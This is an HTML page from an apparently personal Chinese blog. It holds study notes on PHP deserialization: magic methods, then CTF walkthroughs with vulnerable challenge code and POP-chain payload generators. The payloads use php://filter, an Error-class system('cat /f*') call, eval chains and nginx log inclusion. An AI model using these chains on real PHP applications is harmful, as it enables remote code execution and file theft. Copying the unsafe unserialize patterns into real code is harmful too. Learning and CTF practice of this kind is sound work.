@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="反序列化[TOC] 函数1._construct()  实例化对象里面有魔术方法是会触发该条件（实例化一个对象的时候） 2._destruct() _ _代码执行完被释放的时候，代码运行完会销毁，出发析构函数_destruct() 3._sleep():  触发时机:序列化serialize()之前 功能：对象被序列化之前出发，返回需要被序列化存储的成员属性，删除不必要的属性 参数：return">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="反序列化[TOC] 函数1._construct()  实例化对象里面有魔术方法是会触发该条件（实例化一个对象的时候） 2._destruct() _ _代码执行完被释放的时候，代码运行完会销毁，出发析构函数_destruct() 3._sleep():  触发时机:序列化serialize()之前 功能：对象被序列化之前出发，返回需要被序列化存储的成员属性，删除不必要的属性 参数：return">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-19T05:12:33.254Z">
+<meta property="article:modified_time" content="2025-05-07T12:21:09.501Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-反序列化" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  	<time datetime="2025-04-19T05:12:33.254Z" itemprop="datePublished">2025-04-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>[TOC]</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><strong>1._construct()</strong> </p>
+<p>实例化对象里面有魔术方法是会触发该条件（实例化一个对象的时候）</p>
+<p><strong>2._destruct() _</strong></p>
+<p>_代码执行完被释放的时候，代码运行完会销毁，出发析构函数_destruct()</p>
+<p><strong>3._sleep():</strong> </p>
+<p>触发时机:序列化serialize()之前 功能：对象被序列化之前出发，返回需要被序列化存储的成员属性，删除不必要的属性 参数：return array</p>
+<p>**4._wakeup(): **</p>
+<p>触发时机：反序列化之前</p>
+<p><strong>5.call():</strong></p>
+<p>调用一个不存在的函数</p>
+<p>如果一个类没有设置 call() ，对象无法调用受限方法。设置魔术方法call() ,对象成功调用受限方法。</p>
+<p><strong>6.invoke()</strong> </p>
+<p>当脚本尝试将对象调用为函数时触发（把对象当成函数就可以实现）</p>
+<p><strong>7.toString()</strong></p>
+<p>把类当作字符串使用时触发（有echo就行）</p>
+<p><strong>8.get()</strong></p>
+<p>用于从不可访问的属性读取数据</p>
+<p><strong>9.set()</strong></p>
+<p>用于将数据写入不可访问的属性</p>
+<p><strong>10.inset()</strong></p>
+<p>在不可访问的属性上调用inset()或empty()触发</p>
+<p><strong>11.unset()</strong></p>
+<p>在不可访问的属性上使用unset()时触发</p>
+<p><strong>12.callStatic</strong></p>
+<p>在静态上下文中调用不可访问的方法时触发</p>
+<p>#eg</p>
+<p>###<strong>1.</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $functioin = $this-&gt;release;</span><br><span class="line">        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;胜利！&lt;br&gt;&quot;;</span><br><span class="line">        include($this-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;开始召唤从者！&lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;payload&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;payload&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;//3，目的是触发__get()，我们留意到这里调用了$excalibuer里的arrow属性，显然类prepare里没有arrow属性，丢到这里刚好能触发__get()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;（//2，把将 $this-&gt;release 属性赋值给了 $function）</span><br><span class="line">        $functioin = $this-&gt;release;//在这里被当作函数调用，显而易见能把saber类丢给这里的$release</span><br><span class="line">        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;//文件包含的地方标记为1，想要包含需要触发__invoke()的话需要找能把saber类当作函数触发的地方</span><br><span class="line">        echo &quot;胜利！&lt;br&gt;&quot;;</span><br><span class="line">        include($this-&gt;weapon);//文件包含 想到伪协议 可以执行命令</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;开始召唤从者！&lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;Saber;//4,目的是触发刚刚第三层的tostring，这里有个echo</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new saber();</span><br><span class="line">$a-&gt;weapon=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">$b=new prepare();</span><br><span class="line">$b-&gt;release=$a;</span><br><span class="line">$c=new artifact();</span><br><span class="line">$c-&gt;excalibuer=$b;</span><br><span class="line">$d=new summon();</span><br><span class="line">$d-&gt;Saber=$c;</span><br><span class="line">echo serialize($d);</span><br><span class="line">//O:6:&quot;summon&quot;:2:&#123;s:5:&quot;Saber&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:5:&quot;saber&quot;:1:&#123;s:6:&quot;weapon&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;s:5:&quot;Rider&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-动态类实例化"><a href="#2-动态类实例化" class="headerlink" title="2.动态类实例化"></a>2.动态类实例化</h3><h4 id="1-Error内置类"><a href="#1-Error内置类" class="headerlink" title="1.Error内置类"></a>1.Error内置类</h4><p>也是触发_tostring方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$aa=$_GET[&#x27;aa&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$bb=$_GET[&#x27;bb&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码解释：</strong></p>
+<p><strong>动态类实例化：<code>new $a($aa)</code> 和 <code>new $b($bb)</code></strong> ：</p>
+<ul>
+<li>通过<code>$_GET</code>参数<code>a</code>和<code>b</code>动态实例化类。</li>
+<li>用户可以通过<code>$_GET</code>参数传递任何有效的类名，甚至可以加载恶意类。</li>
+</ul>
+<p><strong>动态类实例化：<code>new $a($aa)</code> 和 <code>new $b($bb)</code></strong> ：</p>
+<ul>
+<li>使用<code>$_GET</code>参数<code>c</code>调用动态方法。</li>
+<li>用户可以控制调用的方法，可能触发敏感方法或注入恶意代码。</li>
+</ul>
+<p><strong>链式调用：<code>((new $a($aa))-&gt;$c())((new $b($bb))-&gt;$c());</code></strong> </p>
+<ul>
+<li><ul>
+<li>用<code>$a</code>和<code>$aa</code>创建一个对象，并调用其<code>$c</code>方法。</li>
+<li>将该方法返回的结果作为函数调用，参数是另一个由<code>$b</code>和<code>$bb</code>创建的对象，并调用其<code>$c</code>方法。</li>
+</ul>
+</li>
+<li>如果<code>$c</code>返回一个可调用的对象或匿名函数，那么攻击者可以执行任意代码。</li>
+</ul>
+<p><strong>常见的攻击场景有远程代码执行（RCE ）</strong></p>
+<p><strong>wp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-DirectoryIterator内置类"><a href="#2-DirectoryIterator内置类" class="headerlink" title="2.DirectoryIterator内置类"></a>2.DirectoryIterator内置类</h4><p>触发__toString方法，找到根目录下的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=DirectoryIterator&amp;aa=glob:///f*&amp;c=__toString</span><br><span class="line">?a=SplFileObject&amp;aa=php://filter/convert.base64-encode/resource=/flag&amp;c=__toString</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-XFCTF-ezPOP"><a href="#3-XFCTF-ezPOP" class="headerlink" title="3.XFCTF ezPOP"></a>3.XFCTF ezPOP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class AAA</span><br><span class="line">&#123;</span><br><span class="line">    public $s;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 A &lt;br&gt;&quot;;</span><br><span class="line">        $p = $this-&gt;a;</span><br><span class="line">        return $this-&gt;s-&gt;$p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BBB</span><br><span class="line">&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    public $d;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 B &lt;br&gt;&quot;;</span><br><span class="line">        $a=$_POST[&#x27;a&#x27;];</span><br><span class="line">        $b=$_POST;</span><br><span class="line">        $c=$this-&gt;c;</span><br><span class="line">        $d=$this-&gt;d;</span><br><span class="line">        if (isset($b[&#x27;a&#x27;])) &#123;</span><br><span class="line">            unset($b[&#x27;a&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        call_user_func($a,$b)($c)($d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CCC</span><br><span class="line">&#123;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;you get 2 C &lt;br&gt;&quot;;</span><br><span class="line">        echo $this-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;xy&#x27;])) &#123;</span><br><span class="line">    $a = unserialize($_GET[&#x27;xy&#x27;]);</span><br><span class="line">    throw new Exception(&quot;noooooob!!!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有点长，简单的要分析一下，要得到flag,正常是反向推理。要得到flag大概率是<code>call_user_func($a,$b)($c)($d);</code>这个实现的，简单来说这是个嵌套的函数。<code>__get</code>是调用的成员属性不存在,才会调用。而AAA里的<code>$this-&gt;s-&gt;$p;</code> 可以进行调用一个不存在的从而实现调用。<code>__toString</code>把对象当成字符串调用，通常echo就可以调用成功。<code>echo $this-&gt;c;</code>就可以实现。那么显而易见大概的流程已经出来了。</p>
+<p>CCC::destruct —&gt; AAA::toString—&gt;BBB::get</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AAA &#123;</span><br><span class="line">    </span><br><span class="line">    public $s;</span><br><span class="line">    public $a; </span><br><span class="line">&#125;</span><br><span class="line">class BBB &#123;</span><br><span class="line">    public $c=&quot;echo system&quot;;</span><br><span class="line">    public $d=&quot;cat /flag&quot;; </span><br><span class="line">&#125;</span><br><span class="line">class CCC</span><br><span class="line">&#123; public $c; </span><br><span class="line">&#125;</span><br><span class="line">$a=new CCC;</span><br><span class="line">$b=new AAA;</span><br><span class="line">$c=new BBB;</span><br><span class="line">$a-&gt;c=$b;</span><br><span class="line">$b-&gt;s=$c;</span><br><span class="line">$b-&gt;a=&quot;eval&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a`=new CCC;实例化调用__destruct(),之后就可以通过echo调用__tostring().里面调用`$p = $this-&gt;a;</span><br></pre></td></tr></table></figure>
+
+<p>只要给a赋值BBB不存在的变量然后通过return，就能调用__get().</p>
+<p>这里还要介绍一下implode函数，implode函数可以拼接内容，把后面的$b,c,d连起来构成语句</p>
+<p>c,c,d已经赋值好了，还需要post传值</p>
+<p>$b也可以传入exec,最后还有个小tip,原文都是2A,2B,2C，需要把类后面的属性即CCC后面的1改成2.</p>
+<p>大题思路是这样，中间可能有冗杂的内容，至少把题目写出来了</p>
+<h3 id="4-XYNU-ctf-web"><a href="#4-XYNU-ctf-web" class="headerlink" title="4.XYNU ctf web"></a>4.XYNU ctf web</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;how to bypass?&quot;;</span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $functioin = $this-&gt;release;</span><br><span class="line">        echo &quot;prepare to hack&quot;;</span><br><span class="line">        return $functioin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class hacking&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;win!&quot;;</span><br><span class="line">        include($this-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Hacker;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;start hacking&quot;;</span><br><span class="line">        echo $this-&gt;Hacker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;payload&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;payload&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先知道用到的几种魔术方法</span><br><span class="line"></span><br><span class="line">__toString：当一个对象被当作一个字符串被调用，把类当作字符串使用时触发。</span><br><span class="line"></span><br><span class="line">__get()：用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行</span><br><span class="line"></span><br><span class="line">__invoke：当脚本尝试将对象调用为函数时触发</span><br><span class="line"></span><br><span class="line">__wakeup：调用unserialize()时触发</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line">&#125;</span><br><span class="line">class hacking&#123;</span><br><span class="line">    public $weapon;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Hacker;</span><br><span class="line">    public $Rider;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 构建POP链</span><br><span class="line">// 1. 初始化hacking对象（最终执行文件包含）</span><br><span class="line">$h = new hacking();</span><br><span class="line">$h-&gt;weapon=&quot;/var/log/nginx/access.log&quot;; // 目标文件</span><br><span class="line"></span><br><span class="line">// 2. 初始化prepare对象（触发__get）</span><br><span class="line">$p = new prepare();</span><br><span class="line">$p-&gt;release = $h; // 将hacking对象绑定到release属性</span><br><span class="line"></span><br><span class="line">// 3. 初始化artifact对象（触发__toString）</span><br><span class="line">$a = new artifact();</span><br><span class="line">$a-&gt;excalibuer = $p; // 将prepare对象绑定到excalibuer属性</span><br><span class="line"></span><br><span class="line">// 4. 初始化summon对象（反序列化入口）</span><br><span class="line">$s = new summon();</span><br><span class="line">$s-&gt;Hacker = $a; // 将artifact对象绑定到Hacker属性</span><br><span class="line"></span><br><span class="line">// 生成Payload</span><br><span class="line">$payload = serialize($s);</span><br><span class="line">echo $payload;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=O:6:&quot;summon&quot;:2:&#123;s:6:&quot;Hacker&quot;;O:8:&quot;artifact&quot;:2:&#123;s:10:&quot;excalibuer&quot;;O:7:&quot;prepare&quot;:1:&#123;s:7:&quot;release&quot;;O:7:&quot;hacking&quot;:1:&#123;s:6:&quot;weapon&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;&#125;s:5:&quot;arrow&quot;;N;&#125;s:5:&quot;Rider&quot;;N;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h3><p><strong>字符变多:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">总结：</span><br><span class="line">先看过滤函数，找出字符变多还是字符变少，并且计算变化个数</span><br><span class="line">多出一个字符，构造过滤字符的个数为构造的payload的长度</span><br><span class="line">多出n个字符，构造过滤字符的个数为构造的payload的长度/n</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/19/SQL/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/19/%E4%BC%AA%E5%8A%A0%E5%AF%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
